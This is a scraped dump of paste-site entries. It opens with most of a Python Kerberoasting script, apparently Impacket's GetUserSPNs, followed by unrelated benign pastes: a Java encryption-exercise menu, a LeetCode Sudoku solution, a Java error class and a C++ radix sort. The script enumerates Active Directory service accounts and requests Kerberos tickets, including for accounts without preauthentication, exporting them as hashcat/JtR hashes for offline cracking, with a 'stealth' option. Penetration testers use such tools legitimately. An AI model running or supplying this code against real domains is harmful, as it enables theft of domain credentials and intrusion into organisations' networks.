                                                 self.__aesKey, kdcHost=self.__kdcIP)
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    logging.critical(""NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos ""
                                     ""authentication instead."")
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        logging.critical(""If the credentials are valid, check the hostname and IP address of KDC. They ""
                                         ""must match exactly each other"")
                raise

        # Building the search filter
        filter_spn = ""servicePrincipalName=*""
        filter_person = ""objectCategory=person""
        filter_not_disabled = ""!(userAccountControl:1.2.840.113556.1.4.803:=2)""

        searchFilter = ""(&""
        searchFilter += ""("" + filter_person + "")""
        searchFilter += ""("" + filter_not_disabled + "")""

        if self.__stealth is True:
            logging.warning('Stealth option may cause huge memory consumption / out-of-memory errors on very large domains.')
        else:
            searchFilter += ""("" + filter_spn + "")""

        if self.__requestUser is not None:
            searchFilter += '(sAMAccountName:=%s)' % self.__requestUser

        searchFilter += ')'

        try:
            # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
            paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)

            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         searchControls=[paged_search_control])

        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                # We should never reach this code as we use paged search now
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                resp = e.getAnswers()
                pass
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers) > 0:
            self.printTable(answers, header=[""ServicePrincipalName"", ""Name"", ""MemberOf"", ""PasswordLastSet"", ""LastLogon"",
                                             ""Delegation""])
            print('\n\n')

            if self.__requestTGS is True or self.__requestUser is not None:
                # Let's get unique user names and a SPN to request a TGS for
                users = dict((vals[1], vals[0]) for vals in answers)

                # Get a TGT for the current user
                TGT = self.getTGT()

                if self.__outputFileName is not None:
                    fd = open(self.__outputFileName, 'w+')
                else:
                    fd = None

                for user, SPN in users.items():
                    sAMAccountName = user
                    downLevelLogonName = self.__targetDomain + ""\\"" + sAMAccountName

                    try:
                        principalName = Principal()
                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                        principalName.components = [downLevelLogonName]

                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                self.__kdcIP,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
                        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                       self.__targetDomain + ""/"" + sAMAccountName, fd)
                    except Exception as e:
                        logging.debug(""Exception:"", exc_info=True)
                        logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))

                if fd is not None:
                    fd.close()

        else:
            print(""No entries found!"")

    def request_users_file_TGSs(self):

        with open(self.__usersFile) as fi:
            usernames = [line.strip() for line in fi]

        self.request_multiple_TGSs(usernames)

    def request_multiple_TGSs(self, usernames):
        if self.__outputFileName is not None:
            fd = open(self.__outputFileName, 'w+')
        else:
            fd = None
            
        if self.__no_preauth:
            for username in usernames:
                try:
                    no_preauth_pincipal = Principal(self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=no_preauth_pincipal,
                                                                            password=self.__password,
                                                                            domain=self.__domain,
                                                                            lmhash=(self.__lmhash),
                                                                            nthash=(self.__nthash),
                                                                            aesKey=self.__aesKey,
                                                                            kdcHost=self.__kdcHost,
                                                                            serverName=username,
                                                                            kerberoast_no_preauth=True)
                    self.outputTGS(tgt, oldSessionKey, sessionKey, username, username, fd)
                except Exception as e:
                    logging.debug(""Exception:"", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))

            if fd is not None:
                fd.close()
        else:
            # Get a TGT for the current user
            TGT = self.getTGT()
            
            for username in usernames:
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principalName.components = [username]

                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                            self.__kdcIP,
                                                                            TGT['KDC_REP'], TGT['cipher'],
                                                                            TGT['sessionKey'])
                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
                except Exception as e:
                    logging.debug(""Exception:"", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))

            if fd is not None:
                fd.close()


# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description=""Queries target domain for SPNs that are running ""
                                                                ""under a user account"")

    parser.add_argument('target', action='store', help='domain[/username[:password]]')
    parser.add_argument('-target-domain', action='store',
                        help='Domain to query/request if different than the domain of the user. '
                             'Allows for Kerberoasting across trusts.')
    parser.add_argument('-no-preauth', action='store', help='account that does not require preauth, to obtain Service Ticket'
                                                         ' through the AS')
    parser.add_argument('-stealth', action='store_true', help='Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. '
                                                              'May cause huge memory consumption / errors on large domains.')
    parser.add_argument('-usersfile', help='File with user per line to test')
    parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
                                                                             'in JtR/hashcat format (default False)')
    parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
                                                                                  'to the user specified (just the username, no domain needed)')
    parser.add_argument('-save', action='store_true', default=False, help='Saves TGS requested to disk. Format is '
                                                                          '<username>.ccache. Auto selects -request')
    parser.add_argument('-outputfile', action='store',
                        help='Output filename to write ciphers in JtR/hashcat format. Auto selects -request')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action=""store"", metavar=""LMHASH:NTHASH"", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action=""store_true"", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action=""store_true"",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action=""store"", metavar=""hex key"", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) '
                                                                            'specified in the target parameter. Ignored'
                                                                            'if -target-domain is specified.')
    group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. '
                                                                            'If ommited, the domain part (FQDN) '
                                                                            'specified in the account parameter will be used')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.no_preauth and options.usersfile is None:
        logging.error('You have to specify -usersfile when -no-preauth is supplied. Usersfile must contain'
                      ' a list of SPNs and/or sAMAccountNames to Kerberoast.')
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    userDomain, username, password = parse_credentials(options.target)

    if userDomain == '':
        logging.critical('userDomain should be specified!')
        sys.exit(1)

    if options.target_domain:
        targetDomain = options.target_domain
    else:
        targetDomain = userDomain

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass(""Password:"")

    if options.aesKey is not None:
        options.k = True

    if options.save is True or options.outputfile is not None:
        options.request = True

    try:
        executer = GetUserSPNs(username, password, userDomain, targetDomain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))"
3sc93LV8,UserInterface.java,ramosjorge,Java,Monday 2nd of October 2023 01:48:58 PM CDT,"package view;

public class UserInterface {

    public static void mainMenu() {
        System.out.print(

                ""\nACTIVIDAD UF1 PROGRAMACIÓN DE SERVICIOS Y PROCESOS\n\n"" +
                        """"""
                                \t1.Cifrar mensaje
                                \t2.Descifrar mensaje
                                \t-------------------------
                                \t3.Salir\s
                                """"""
                        + ""\nOpcion: ""
        );
    }

    public static void getDocumentName() {
        System.out.print(""Introduzca el nombre del documento: "");
    }

    public static void getStrText() {
        System.out.print(""Introduzca el texto a codificar: "");
    }
}"
ek9kZj59,LeetCode 36 - Valid Sudoku - NeetCode solution,nathanwailes,Python,Monday 2nd of October 2023 01:48:41 PM CDT,"class Solution:
    def isValidSudoku(self, board: List[List[string]]) -> bool:
        cols = collections.defaultdict(set)
        rows = collections.defaultdict(set)
        squares = collections.defaultdict(set) # key = (r /3, c /3)
        
        for r in range(9):
            for c in range(9):
                if board[r][c] == ""."":
                    continue
                if (board[r][c] in rows[r] or
                    board[r][c] in cols[c] or
                    board[r][c] in squares[(r //3, c //3)]):
                    return False
                cols[c].add(board[r][c])
                rows[r].add(board[r][c])
                squares[(r // 3, c // 3)].add(board[r][c])
        return True
"
kw5BwLyW,ErrorInterface.java,ramosjorge,Java,Monday 2nd of October 2023 01:48:16 PM CDT,"package view;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class ErrorInterface {

    public static void chooseValidOption() {
        System.err.println(""Introduzca una opción correcta"");
    }

    public static void fileNotFoundException(FileNotFoundException e) {
        System.err.println(""FileNotFoundException "".concat(e.getMessage()));
    }

    public static void ioException(IOException e) {
        System.err.println(""IOException "".concat(e.getMessage()));
    }

    public static void noSuchAlgorithmException(NoSuchAlgorithmException e) {
        System.err.println(""NoSuchAlgorithmException"".concat(e.getMessage()));
    }

    public static void noSuchPaddingException(NoSuchPaddingException e) {
        System.err.println(""NoSuchPaddingException"".concat(e.getMessage()));
    }

    public static void illegalBlockSizeException(IllegalBlockSizeException e) {
        System.err.println(""IllegalBlockSizeException"".concat(e.getMessage()));
    }

    public static void invalidKeyException(InvalidKeyException e) {
        System.err.println(""InvalidKeyException"".concat(e.getMessage()));
    }

    public static void badPaddingException(BadPaddingException e) {
        System.err.println(""BadPaddingException"".concat(e.getMessage()));
    }
}"
RJbUk1xA,LSD_v1,Korotkodul,C++,Monday 2nd of October 2023 01:47:00 PM CDT,"#include <cmath>
#include <iostream>
#include <vector>

using std::cin;
using std::cout;
using std::max;
using std::min;
using std::string;
using std::vector;
using Ll = long long;

const int k20 = 20;
const int k10 = 10;
int len;
vector<Ll> ar;
vector<int> less_than;
vector<Ll> hlp;

int Digit(Ll num, int par) {
  Ll mod = pow(k10, par + 1);
  Ll div = pow(k10, par);
  return num % mod / div;
}

void LSD(int par) {
  less_than.assign(k10, 0);
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    less_than[dig]++;
  }
  int cnt = 0;
  for (int id = 0; id < k10; ++id) {
    int point = less_than[id];
    less_than[id] = cnt;
    cnt += point;
  }
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    hlp[less_than[dig]] = ar[id];
    less_than[dig]++;
  }
  ar = hlp;
}

int main() {
  /*std::ios::sync_with_stdio(false);
  std::cin.tie(0);
  std::cout.tie(0);*/
  cin >> len;
  ar.resize(len);
  hlp.resize(len);
  for (Ll& el : ar) {
    cin >> el;
  }
  for (int par = 0; par < k20; ++par) {
    LSD(par);
  }
  for (Ll el : ar) {
    cout << el << ""\n"";
  }
}
"
